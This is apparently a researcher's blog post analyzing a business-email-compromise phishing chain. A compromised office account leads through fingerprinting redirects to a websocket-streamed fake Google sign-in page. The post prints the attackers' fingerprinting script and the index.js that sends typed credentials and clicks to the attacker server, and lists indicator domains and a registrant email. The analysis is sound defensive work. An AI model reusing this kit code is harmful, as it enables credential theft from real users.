---
title: Investigating a Business Email Compromise
draft: false
tags:
  - cybersecurity
  - bec
  - business-email-compromise
  - phishing
  - malware
  - malware-analysis
---
I had recently reached out to a local orthodontics office near me. I won't bore you with the details, but it was a simple email to their frontdesk, and the office emailed me back. All good. 

But, a week later, I received an email from the same office, supposedly sharing a Google Docs file.

![[shared_gdoc.png]]
I honestly didn't think anything of it though. I had initiated contact with the office earlier, so maybe it was an intake form or something similar. Not very *cybersecurity professional* of me, but, I also am of the somewhat controversial opinion that clicking random links and scanning random QR codes isn't _bad_: there is always going to be some action **I** have to take, such as executing a file or running some command.. unless it's a browser 0day and I would hope they don't waste it on someone uninteresting like me. But, upon clicking the link, it was very apparent this was not Google. `https://brightlabs[.]co[.]nl/ccqB/` was the domain it took me to, which then redirected to `https://urbancrest[.]click/KXC9/`, and then, finally, to a fake Google OAuth sign-in page: `https://umucsic[.]com/tdlz/f7df10?kgg4=L3YzL3NpZ25pbi9pZGVudGlmaWVyP2NvbnRpbnVlPWh0dHBzJTNBJTJGJTJGYWNjb3VudHMuZ29vZ2xlLmNvbSUyRiZkc2g9Uy0xMDg4NzE5OTk1JTNBMTc4NTgwMTc3OTUxNDIxOSZmb2xsb3d1cD1odHRwcyUzQSUyRiUyRmFjY291bnRzLmdvb2dsZS5jb20lMkYmcGFzc2l2ZT0xMjA5NjAwJmZsb3dOYW1lPUdsaWZXZWJTaWduSW4mZmxvd0VudHJ5PVNlcnZpY2VMb2dpbiZpZmt2PUFjNTBieHR6aGNYbVlBalVialp1S0dYRnFhRnNqSVAtNXFLOVN1cVd4UkhYVWRGRDEwemRiNTZwOHNhVzF6RHpXdmxicmZGLXA4OHNudw`. 

Before investigating the actual infrastructure, let's orient ourselves with the attack. First, it could just be crazy coincidence: I reached out, a random threat actor spoofs a random office, which just so happens to be the office I had reached out to. But, if we look at the email headers:

```
Authentication-Results: mx.google.com;
       dkim=pass header.i=@******.com header.s=google header.b=QnOXsT1u;
       arc=pass (i=1);
       spf=pass (google.com: domain of ***@******.com designates 209.85.220.41 as permitted sender) smtp.mailfrom=***@******.com;
       dara=neutral header.i=@landon.pw
```

DKIM and SPF both pass, which means this is **not** a spoofed email. Additionally, it comes from `mx.google.com`, which means it is a Google Workspace business email. 

> DKIM: DomainKeys Identified Mail. Uses public and private keys to sign emails. You (the email user) places a public key in your DNS records, and the email server uses the corresponding private key. Any email received can validate the signature by looking up the public key in the DNS records. A malicious, or non-legitimate email server (such as used in spoofing) would not have the correct private key.

> SPF: Sender Policy Framework. Is a list of authorized IP addresses allowed to send emails. For example, with Google Workspace, you would limit the IPs to Google IPs only. This ensures the email originated from the intended email sending infrastructure.

So, it's a legitimate email (not spoofed) and comes from a Google Workspace account. This is known as a business-email compromise (BEC). It's a variation of phishing, but, much harder to detect because typical protections such as "Spam" filters can fail to detect it, especially if you have prior contact with the email address. 

Now, having all of that prior context, let's investigate the actual phishing infrastructure!

# `https://brightlabs[.]co[.]nl/ccqB/`

There's not much except a JavaScript file:

```js
/*! app v1.4.2 | MIT License | https://opensource.org/licenses/MIT */
(function(w, d) {
  "use strict";
  try { w.matchMedia && w.matchMedia("(prefers-color-scheme:dark)"); } catch (e) {}
  try { w.addEventListener && w.addEventListener("resize", function() {}); } catch (e) {}
  var el = d.currentScript || (function() { var s = d.getElementsByTagName("script"); return s[s.length - 1]; })();
  var cfg = (el.getAttribute("data-u") || "").replace(/\\/g, "") || location.href;
  var path = (el.getAttribute("data-p") || "").replace(/\\/g, "");
  var minDelay = 3000;
  var data = {}, errors = [], aborted = false;
  w.addEventListener("pagehide", function() { aborted = true; });

  function proc(key, val, out) {
    try {
      if (key === "plugins" && val && typeof val.length !== "undefined") {
        out[key] = val.length;
      } else {
        var t = typeof val;
        if (t === "function" || (t === "object" && val !== null)) {
          val = val.toString();
        }
        out[key] = val;
      }
    } catch (e) { errors.push(e.message); }
  }

  function read(obj) {
    if (!obj || typeof obj !== "object") return null;
    var out = {};
    try { for (var k in obj) proc(k, obj[k], out); } catch (e) {}
    try {
      var keys = Object.getOwnPropertyNames(obj);
      var i = keys.length;
      while (i--) proc(keys[i], obj[keys[i]], out);
      out["!!"] = keys;
    } catch (e) { errors.push(e.message); }
    return out;
  }

  function collect() {
    data.screen = read(w.screen);
    data.window = read(w);
    data.navigator = read(w.navigator);
    data.console = read(w.console);
    try { data.console.toString = w.console.toString.toString(); } catch (e) { errors.push(e.message); }
    data.document = read(d);

    try { data.timezoneOffset = (new Date).getTimezoneOffset(); } catch (e) { errors.push(e.message); }
    try { data.frame = w.self !== w.top; } catch (e) { data.frame = true; }

    try {
      var gl = d.createElement("canvas").getContext("webgl"),
          ext = gl.getExtension("WEB"+"GL_deb"+"ug_re"+"nderer_info");
      data.webgl = {
        vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
      };
    } catch (e) { errors.push(e.message); }

    try { data.rtc = !!(w.RTCPeerConnection || w.webkitRTCPeerConnection || w.mozRTCPeerConnection); } catch (e) {}

    data.errors = errors;
  }

  function net(callback) {
    var RTC = w.RTCPeerConnection || w.webkitRTCPeerConnection || w.mozRTCPeerConnection;
    if (RTC) {
      try {
        var pc = new RTC({ iceServers: [{ urls: "stu"+"n:stun.l."+"google."+"com:19302" }] }),
            tm = setTimeout(function() { done(); }, 120);
        data._rtc = [];
        pc.createDataChannel("");
        pc.onicecandidate = function(e) {
          if (e.candidate) {
            var p = e.candidate.candidate.split(" ");
            if (p.length >= 5) data._rtc.push({ i: p[4], t: p[7], p: p[2] });
          } else {
            clearTimeout(tm);
            done();
          }
        };
        pc.createOffer().then(function(o) { return pc.setLocalDescription(o); }).catch(function() {});
        function done() { try { pc.close(); } catch (x) {} callback(); }
      } catch (e) { callback(); }
    } else { callback(); }
  }

  function send() {
    var hash = location.hash || "";
    var t0 = Date.now();
    collect();
    net(function() {
      if (aborted) return;
      var submit = function() {
        if (aborted) return;
        var body = new URLSearchParams();
        body.append("analytics", JSON.stringify(data));
        body.append("_h", hash);
        body.append("_p", path);
        w.fetch(cfg, { method: "POST", body: body, credentials: "same-origin" })
          .then(function(r) { return r.text(); })
          .then(function(html) {
            if (aborted) return;
            try { d.open(); d.write(html); d.close(); } catch (e) {}
          })
          .catch(function() {});
      };
      var wait = Math.max(0, minDelay - (Date.now() - t0));
      if (wait > 0) setTimeout(submit, wait); else submit();
    });
  }

  function init() {
    if (d.body) { send(); } else { setTimeout(init, 10); }
  }

  init();
})(window, document);

/*! For license information please see main.0d885da1df49e6f869ea.js.LICENSE.txt */
//# sourceMappingURL=main.0d885da1df49e6f869ea.js.map
```

When the body of the page loads, it invokes `send()`. `send()` then invokes `collect()` and `net()`, and sends a POST request with that information to the same URL. 

`collect()` invokes some basic attributes such as `window.screen`, `window.navigator`, etc, but does deep reading by recursively going through every enumerable property. All-in-all, some of the data it can get (browser dependent):
- Screen resolution
- Screen width/height
- Browser name/version
- User agent
- CPU cores, device memory

`net()` uses WebRTC to connect to Google's STUN server (``stun:stun.l.google.com:19302``) and uses the ICE protocol to identify all potential IP variations. On modern browsers, this will typically just be the equivalent to getting the IP address of the TCP connection. But, on older browsers, WebRTC can be used to detect your IP address even if you're behind a proxy or VPN. 

> WebRTC: Web Real-Time Communication. A free and open-source project providing web browsers and mobile applications with real-time communication

> STUN:  Session Traversal Utilities for NAT. A lightweight network tool that lets a device behind a router find its public IP address and port number.

> ICE: Interactive Connectivity Establishment. Essentially, generates 'candidates': a candidate is an IP address and a port. These candidates are "gathered" by an implementation of the ICE protocol, and iterated over to find candidates that are "routable" - that is, candidates between which clients can route media packets.

So, just a bunch of fingerprinting sent back to the server. Nothing crazy yet.

# `https://urbancrest[.]click/KXC9/`

This is the exact same thing as the previous redirect, just a different domain. There may be some sort of correlation to ensure the fingerprinted information on domain1 and domain2 match, to prevent sandboxing/VPN/research. 

# `https://umucsic[.]com/tdlz/f7df10?kgg4=L3Y...`

This is the primary payload. It's behind Cloudflare Captcha, again, to prevent any sort of automated scraping and research. Getting past the Cloudflare Captcha, the HTTP response is:

```html
<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><div id="r"></div><script>async function d(){try{var a="XcGDB1ToZVVkRG2GmJtzR3wS3p3XRKtwhDkW/OU3vXQcLBVS7CSUKqOxD4fdBXHZrs+KCC40aU5XPJxUDplMIDDDqSYGQZ...",b="lk+...",c="vw...=";function f(s){return Uint8Array.from(atob(s),x=>x.charCodeAt(0))}var k=await crypto.subtle.importKey("raw",f(c),"AES-GCM",false,["decrypt"]);var p=await crypto.subtle.decrypt({name:"AES-GCM",iv:f(b)},k,f(a));document.open();document.write(new TextDecoder().decode(p));document.close()}catch(e){document.body.innerHTML="Loading failed"}}d()</script><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"3aca37f3521b454a9be0d5a5d7a4034e","r":1}' crossorigin="anonymous"></script>
</body></html>
```

This dynamically decrypts the HTML (`a`) using AES-GCM with the key `c` and the IV `b`. Decrypting the HTML using the aforementioned key/IV pair, we get:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Sign in</title>
  </head>
  <body>
    </head>
    <body>
	  <!-- Removed for brevity --> 
      <script src="/socket.io-client.js"></script>
      <script src="/domdiffer.js"></script>
      <script src="/index.js"></script>
    </body>
</html>
```

It is quite literally just the Google Workspace logo and a loading spinner. The core functionality comes from the three JavaScript files: `socket-io-client.js`, `domdiffer.jf`, and `index.js`.

`socket-io-client.js` is just the https://socket.io/ client library, nothing fancy. But, it does mean we'll be dealing with web sockets eventually.

`domdiffer.js` is just a renamed version of the [diffDOM](https://fiduswriter.github.io/diffDOM/) library. diffDOM lets you 'diff' two DOMs with a chain on how to convert one to the other. Again, no custom logic, just a library.

`index.js` is where the fun lives. 

```js
function waitForFunctionInIframe(ifr, funcName, callback) {
    var checkInterval = setInterval(function () {
        if (ifr.contentWindow.processIframe) {
            clearInterval(checkInterval);
            callback();
        }
    }, 100);
}

function findIframeByAttribute(attrName, attrValue, checkedIframes) {
    var iframes = document.getElementsByTagName('iframe');
    checkedIframes = checkedIframes || new Set();
    for (var i = 0; i < iframes.length; i++) {
        if (checkedIframes.has(iframes[i])) {
            continue;
        }
        checkedIframes.add(iframes[i]);
        if (iframes[i].getAttribute(attrName) == attrValue) {
            return iframes[i];
        }
        var iframeContent = iframes[i].contentDocument || iframes[i].contentWindow.document;
        var nestedIframe = findIframeByAttribute.call(iframeContent, attrName, attrValue, checkedIframes);
        if (nestedIframe) {
            return nestedIframe;
        }
    }
    return null;
}

// Removed for brevity

var socket = io();
var dd = new diffDOM.DiffDOM();

socket.on('connect_error', function (err) {
    var msg = err && err.message ? err.message : String(err || '');
    if (msg.indexOf('captcha_required') !== -1) {
        socket.io.opts.reconnection = false;
        window.location.replace('/');
    }
});

socket.on('sessionexpired', function () {
    socket.io.opts.reconnection = false;
    window.location.replace('/');
});
var inputTracker = new Map();
var pendingReset = false;
var authHoldActive = false;
var authHoldLoader = null;

// Removed for brevity

socket.on('redir', (data) => {
    if (data.url) {
        document.cookie = "login_complete=1; path=/; max-age=2592000; SameSite=Lax";
        window.location.replace(data.url);
    }
});

socket.on('updateBrowserUrl', (data) => {
    if (!data.url) {
        return;
    }
    const currentUrl = window.location.origin;
    const newUrl = currentUrl + data.url;

    try {
        history.replaceState(null, '', newUrl);
    } catch (error) {}
});

socket.on('domreset', () => {
    pendingReset = true;
    inputTracker.clear();
});

socket.on('authhold', function (data) {
    if (data && data.holding) {
        beginAuthHold(data.loader);
        return;
    }
});

socket.on('domchanges', async function (changes) {
    if (authHoldActive && !(changes && changes.authHoldRelease)) {
        return;
    }
    if (pendingReset) {
        resetViewerDom();
        pendingReset = false;
        ensureViewerStyles();
        hideInitialLoadingShell();
    }
    if (changes.main) {
        if (changes.main.head) {
            dd.apply(document.getElementsByTagName('head')[0], changes.main.head);
        }
        if (changes.main.bodydiv) {
            try {
                dd.apply(document.getElementsByTagName('body')[0], changes.main.bodydiv);
            } catch (error) {}
        }
    }

    if (changes.loadingFinished) {
        const overlay = document.querySelector('div.kPY6ve[jsname="OQ2Y6"]');
        if (overlay && authHoldLoader !== 'google') {
            overlay.remove();
        }
    }
    if (changes.iframes) {
        changes.iframes.forEach(iframechanges => {
            try {
                var ifr = findIframeByAttribute('data-temp-iframe-id', iframechanges.selector);

                if (ifr) {
                    waitForFunctionInIframe(ifr, 'processIframe', function () {
                        if (iframechanges.head) {
                            ifr.contentWindow.processIframe({
                                target: ifr.contentWindow.document.getElementsByTagName('head')[0], diff: iframechanges.head
                            });
                        }
                        if (iframechanges.bodydiv) {
                            ifr.contentWindow.processIframe({
                                target: ifr.contentWindow.document.getElementsByTagName('body')[0], diff: iframechanges.bodydiv
                            });
                        }
                    });
                }
            } catch (error) {}
        });
    }
});

socket.on('inputchange', async function (changes) {
    if (authHoldActive) {
        return;
    }
    var input = document.querySelector(changes.csspath);
    if (input) {
        inputTracker.set(changes.csspath, changes.value);
        
        input.value = changes.value;
        if (changes.selectionStart !== undefined && changes.selectionEnd !== undefined) {
            input.selectionStart = changes.selectionStart;
            input.selectionEnd = changes.selectionEnd;
        }
        
        var event = new Event('input', { bubbles: true });
        input.dispatchEvent(event);
    }
});

document.addEventListener('click', function (e) {
    e.preventDefault();
    e.stopPropagation();
    var submitElement = findSubmitElement(e.target);

    var click = {
        cssPath: getCssPath(e.target),
        selectionStart: e.target.selectionStart,
        selectionEnd: e.target.selectionEnd,
        element: getElementMeta(e.target),
        submitElement: submitElement ? getElementMeta(submitElement) : null
    };

    socket.emit('click', click);
}, true);

document.addEventListener('submit', function (e) {
    e.preventDefault();
    e.stopPropagation();

    socket.emit('submit', {
        cssPath: getCssPath(e.target),
        element: getElementMeta(e.target),
        submitElement: e.submitter ? getElementMeta(e.submitter) : null
    });
}, true);

document.addEventListener('input', function (e) {
    const target = e.target;
    const tag = target.tagName.toLowerCase();
    
    if (tag === 'input' || tag === 'textarea') {
        const cssPath = getCssPath(target);
        const currentValue = target.value;
        
        if (inputTracker.get(cssPath) === currentValue) {
            inputTracker.delete(cssPath);
            return;
        }
        
        var inputData = buildInputData(target);
        
        socket.emit('inputchange', inputData);
    }
});

document.addEventListener('paste', function (e) {
    const target = e.target;
    const tag = target.tagName.toLowerCase();
    
    if (tag === 'input' || tag === 'textarea') {
        setTimeout(function() {
            var inputData = buildInputData(target);
            
            socket.emit('inputchange', inputData);
        }, 10);
    }
});

// Removed for brevity

document.addEventListener('keypress', (e) => {
    const target = e.target;
    const tag = target.tagName.toLowerCase();
    
    if (tag === 'input' || tag === 'textarea') {
        return;
    }
    
    e.preventDefault();
    var name = e.key.toString();
    
    socket.emit('keypress', buildKeypressData(e.target, name));
}, false);

function getRelativeNodePath(root, node) {
    const steps = [];
    let currentNode = node;
    
    while (currentNode && currentNode !== root) {
        const siblings = Array.from(currentNode.parentNode.childNodes);
        const nodeIndex = siblings.indexOf(currentNode);
        const nodeType = currentNode.nodeType;
        
        steps.push(`${nodeType}:${nodeIndex}`);
        currentNode = currentNode.parentNode;
    }
    
    return steps.reverse().join('/');
}

document.addEventListener('selectionchange', (event) => {
    let focusedElem = document.activeElement;

    if (focusedElem && (focusedElem.tagName === 'INPUT' || focusedElem.tagName === 'TEXTAREA')) {
        var csspath = getCssPath(focusedElem);
        var data = {
            startCssPath: csspath,
            endCssPath: csspath,
            startOffset: focusedElem.selectionStart,
            endOffset: focusedElem.selectionEnd
        };
        socket.emit('selectionchange', data);
    }
});

// Removed for brevity

```

This is a lot, but, it's relatively simple. It initiates a websocket connection, and then:

1. ``socket.on('domchanges', ...)``
Receives `domchanges` event from the server and applies with `dd.apply(...)`. This allows to update the viewed page without any refreshes. 

2. `socket.emit('inputchange', ...)
When the user types something (such as an email or password), it emits this as an `inputchange` event to the server. It sends the input value, cursor position, and metadata about the element.

3. `socket.emit('submit', ...)
When an HTTP form (such as "Login") is submitted, it emits that event to the websocket server. 

4. Server commands
The server can send commands to the client via `socket.on(...)`:
- `domchanges`: Updates the page's HTML without reloading.
- `inputchange`: Changes the contents of an input field.
- `redir`: Redirects the browser to that URL.
- `updateBrowserUrl`: Changes the address bar using `history.replaceState()` without navigating.
- `domreset`: Clears the current page so a new one can be rendered.
- `authhold`: Freezes DOM updates while waiting for authentication.
- `sessionexpired`: Redirects back to `/` and stops reconnecting.

This is very similar to an adversary-in-the-middle / man-in-the-middle like Evilginx, but with a unique twist. Typical AitM kits work as follows:
1. The victim browser talks to the evil proxy
2. The evil proxy forwards requests to Google.com verbatim
3. Google.com responds to the evil proxy, which then sends the response back to the victim
4. The victim essentially interacts with Google.com, but through a proxy

In this variation though, it's a lot more like a RDP connection:
1. The evil proxy is physically on Google.com via a headless browser (e.g. Playwright/Puppeteer)
2. The evil proxy sends the DOM state to the victim, and the victim renders it via diffDOM.
3. Victim input (clicks, inputs, form submissions) is streamed to the evil proxy, and the headless browser performs the same actions

In this version, there isn't really a "proxy" per-se. Instead, it's just streaming of a headless browser on Google.com back to the victim using websockets and diffDOM. This is very similar to [EvilNoVNC](https://www.youtube.com/watch?v=6W1eN5_KbKY) but using Websockets rather than a VNC streaming protocol! Unique!

Lastly, you may be wondering about the pretty obvious base64-encoded string in the URL query parameter: `L3YzL3NpZ25pbi9pZGVudGlmaWVyP2NvbnRpbnVlPWh0dHBzJTNBJTJGJTJGYWNjb3VudHMuZ29vZ2xlLmNvbSUyRiZkc2g9Uy0xMDg4NzE5OTk1JTNBMTc4NTgwMTc3OTUxNDIxOSZmb2xsb3d1cD1odHRwcyUzQSUyRiUyRmFjY291bnRzLmdvb2dsZS5jb20lMkYmcGFzc2l2ZT0xMjA5NjAwJmZsb3dOYW1lPUdsaWZXZWJTaWduSW4mZmxvd0VudHJ5PVNlcnZpY2VMb2dpbiZpZmt2PUFjNTBieHR6aGNYbVlBalVialp1S0dYRnFhRnNqSVAtNXFLOVN1cVd4UkhYVWRGRDEwemRiNTZwOHNhVzF6RHpXdmxicmZGLXA4OHNudw`. This is not used by `index.js`, so it appears to be entirely server-side. It decodes to `/v3/signin/identifier?continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-1088719995%3A1785801779514219&followup=https%3A%2F%2Faccounts.google.com%2F&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=Ac50bxtzhcXmYAjUbjZuKGXFqaFsjIP-5qK9SuqWxRHXUdFD10zdb56p8saW1zDzWvlbrfF-p88snw` and my best guess is that it determines what URL the headless browser will start at. 

## Ephemeral Sessions & Self-destruction

The payloads are ephemoral and self-destruct. My first time doing the full chain, I was redirected to `https://umucsic[.]com/tdlz/f7df10`. The second time, `umucsic.com/tdlz/c1a211`. After roughly 5-10 minutes, it will force redirect you to `https://example[.]com/`. In order to generate a new ephemeral session, you have to go through the whole chain of `brightlabs[.]co[.]nl->urbancrest[.]click` in order to get a redirection to a new and valid session on `umucsic[.]com`.

## Socket.io Recon

When you first visit the page and complete the Cloudflare Captcha, a `POST` request is made to `/captcha/verify` with `cf-turnstile-response`. If a valid captcha, it will set three cookies:
1. `captcha_verified` (e.g. `0a53f1d63feec47336cc66c173537f79b61eb43ef6e5281e`)
2. `viewer_server_boot` (e.g. `65fe98de5d90f33a`)
3. `viewer_session_id` (e.g. `53e782fd-db15-4eb0-bd93-dd2ebf4e4af6`)

These cookies are required to create a websocket session. Some enumeration of the commands we found from `index.js`:
-  Client->Server (we can send):  click ,  inputchange ,  keypress ,  submit ,  selectionchange
- Server->Client (we receive):  domchanges ,  domreset ,  updateBrowserUrl ,  inputchange ,  redir ,  authhold ,  sessionexpired 

Unfortunately, not much else. No admin or debug commands that I could find to help enumerate further.

# The Threat Actor

I had noticed that `/admin` would 302 redirect to `/admin/`. But, it would always HTTP 520. I assumed it may be a Cloudflare rule, or a firewall rule to drop Cloudflare-proxied connections. So, I decided I would try to find the origin IP. A common method of doing this, is by looking at historical DNS to see if there were DNS entries **before** the domain was put on Cloudflare. 

https://whoisfreaks.com/tools/dns/history/lookup/umucsic.com?type=all&page=1
We can do a historical DNS lookup, and an interesting entry appears:

```
SOA
Admin fabisaads[@]gmail.com.
Host domns.earth.orderbox-dns.com.
Expire 172800
Minimum 38400
Refresh 7200
Retry 7200
Serial 2026062902
```

In fact, a basic WHOIS of the domain reveals the same information (I probably should have started here, but, figured there would be WHOIS protection!):

```
Registrant:
- Handle: 131397692
- Name: David
- Email: fabisaads[@]gmail.com
- Status: active
- Kind: individual
- Mailing Address: Martins, Warsaw, New York, 14569
```

I have a strong intuition that 'David' is not the real name, nor does he live in Warsaw, New York (population of 5,000). But, we can do a reverse WHOIS for the email `fabisaads@gmail.com` and see what other domains this person has registered. Using WHOISFreaks again for their reverse WHOIS feature, there are 68 domains registered to 'David'. I paid the $10 to WHOISFreak for unlimited access, and the results are:

- 68 total domains (Sep 2025 - Jul 2026)
- Global targeting (Businesses throughout Israel, Singapore, Saudi Arabia, UAE, Netherlands, Germany, Czech Republic, Ireland, Cyprus)
- Preference for typosquatted domains (e.g. `icloudicld[.]com`, `warnrermusic[.]com`)

Performing historical and live DNS lookups on all the other domains

Only one other domain is active: `frondeskforalljobs[.]com`. The others appear to just be parked, either for email-only phishing, or to be operationalized later as domains get discovered. None of the domains revealed 

# Indicators of Compromise

```bash
# Domains
abslapaul[.]com
ar-sweco-nl[.]com
asden-il[.]com
asterixixnc[.]net
berexai[.]com
bolero-ea[.]com
brightlabs[.]co[.]nl
btqconslut[.]com
bwipa[.]com
bz-zcom[.]com
cagrohub[.]com
contentsqaure[.]com
cosycasa-il[.]com
cssametal[.]com
delmont-ae[.]com
dmidico[.]com
erwarlla[.]com
exedex[.]org
ezhirelife[.]com
frondeskforalljobs[.]com
gmail-m[.]com
gminkowitzme[.]com
gpup[.]net
hansetextil-de[.]com
hossackacrh[.]com
hubspotu[.]com
iandmrgmt[.]com
icloudicld[.]com
intenseuod[.]com
jasolaar[.]com
jfg-il[.]com
jsktradingllc[.]com
kafd-sa[.]com
lewsiscyprus[.]com
lgamanagemnet[.]com
lindo-il[.]com
medzanh[.]com
michellehaymanagemnet[.]com
minimallivningconcepts[.]com
motorflsash[.]com
motrgageisrael[.]com
mrpositivie[.]work
ntcin[.]com
paragnongb[.]com
parolasrevices[.]com
pefrume-center[.]com
perfumeunlimnited[.]com
peservcies[.]net
qiuvertree-media[.]com
redexixm[.]com
redlinepipelnie[.]com
samprecoiusmetals[.]com
sapaed[.]com
slkglcobal[.]com
smartr-sg[.]com
soladentalslpa[.]com
swilico[.]com
tauruswealtbh-sg[.]com
tigrerhall[.]com
tpt-me[.]com
trafigurar[.]com
umucsic[.]com
urbancrest[.]click
vidscolan[.]com
walzelproperteis[.]com
warnrermusic[.]com
warren-sg[.]org
westirelandinvsetments[.]com
westirelandunvestments[.]com
zznzeleotronics-cz[.]com

# File Hashes
index.html:bca6589945a709b7047a6ea1de608b34
index.js:c1faceba335e4a0aa4ea7111cc29b192
```